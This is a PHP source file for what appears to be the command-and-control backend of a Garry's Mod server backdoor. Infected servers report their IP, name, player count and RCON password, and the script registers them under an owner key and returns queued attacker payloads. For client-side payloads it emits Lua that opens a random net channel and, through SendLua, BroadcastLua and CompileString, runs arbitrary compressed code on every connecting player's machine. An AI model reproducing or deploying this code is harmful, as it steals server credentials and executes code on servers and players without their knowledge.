<?php
include('../core/class/include.php');

$server_ip =htmlspecialchars($_POST['i']);
$server_name = htmlspecialchars($_POST['n']);
$server_users_number = htmlspecialchars($_POST['nb']);
$rcon = $_POST['rcon'];

if (empty($rcon)) {
	$rcon = "Pas de RCON";
}

$banned = array('rvac', 'script', 'raid');

function contains($str, array $arr)
{
    foreach($arr as $a) {
        if (stripos($str,$a) !== false) return true;
    }
    return false;
}

if ($_SERVER['HTTP_USER_AGENT'] !== "Valve/Steam HTTP Client 1.0 (4000)") {
	header("Location: ../login.php");
}

if(contains($server_name, $banned) == true){
	die("H4X0R Bad Request");
}

if($server_users_number > 128){
	die("Bad Request");
}

$key = $_GET['key'];
$svkey = $_POST['svkey'];
$backdoor = $_POST['string'];

$tempid = Account::GetIdByKey($key);
$svowner = $key;

if (isset($key)) {
if ($server_ip != "" && $server_name != "")
{
	$server_id = Server::GetServerByIP($server_ip);
	if ($server_id == false)
	{

		echo Server::AddServer($server_name, $server_ip, $server_users_number, $svowner, $rcon);
		echo "PrintMessage(10,'')";
	}
	else
	{
		$serverowned = Server::CheckIFOwned($server_ip, $svowner);
		if ($serverowned == true)
		{
			echo Server::UpdateServer($server_id, $server_name, $server_ip, $server_users_number, $svowner, $rcon);
			echo "PrintMessage(10,'')";
		} else
		{
			echo "timer.Remove(\"".$_POST['string']."\")";
			die();
		}
		$payload_id = Server::GetServerPayload($server_id);
		if ($payload_id != -1)
		{
			$server = Server::GetServerInfos($server_id);
			$arg = $server["argument"];
			if ($arg != -1) {
				$payload = html_entity_decode(Payload::GetPayload($payload_id)['payload_content']);
				if (Payload::GetPayload($payload_id)['payload_side'] == "server") {
					echo str_replace("{ARG}", $arg, $payload);
				} else {
					$argedpayload = str_replace("{ARG}", $arg, $payload);
					echo '
local function rdm_str(len)
	if not len or len <= 0 then return "" end
	return rdm_str(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")[math.random(1, 62)]
end

local net_string = rdm_str(25)

util.AddNetworkString(net_string)
BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
hook.Add("PlayerInitialSpawn", "ifyouseethisdontpanicitsme",function(ply)
	if not ply:IsBot() then
		ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
	end
end)

local function SendToClient(code)
	timer.Simple(5, function()
		local data = util.Compress(code)
		local len = #data
		net.Start(net_string)
		net.WriteUInt(len, 16)
		net.WriteData(data, len)
		net.Broadcast()
	end)
end

SendToClient([====['.$argedpayload.']====])';
				}
			} else {
				if (Payload::GetPayload($payload_id)['payload_side'] == "server") {
					echo Payload::GetPayload($payload_id)['payload_content'];
				} else {
					$notargedpayload = Payload::GetPayload($payload_id)['payload_content'];
					echo '
local function rdm_str(len)
	if not len or len <= 0 then return "" end
	return rdm_str(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")[math.random(1, 62)]
end

local net_string = rdm_str(25)

util.AddNetworkString(net_string)
BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
hook.Add("PlayerInitialSpawn", "ifyouseethisdontpanicitsme",function(ply)
	if not ply:IsBot() then
		ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
	end
end)

local function SendToClient(code)
	timer.Simple(5, function()
		local data = util.Compress(code)
		local len = #data
		net.Start(net_string)
		net.WriteUInt(len, 16)
		net.WriteData(data, len)
		net.Broadcast()
	end)
end

SendToClient([====['.$notargedpayload.']====])';
				}
			}
			Server::ResetPayload($server_id);
		} else {
			echo "PrintMessage(10,'')";
		}
	}
}
} else {
	echo 'Wsh mais tes qui a fouiller frer ?';
}
?>
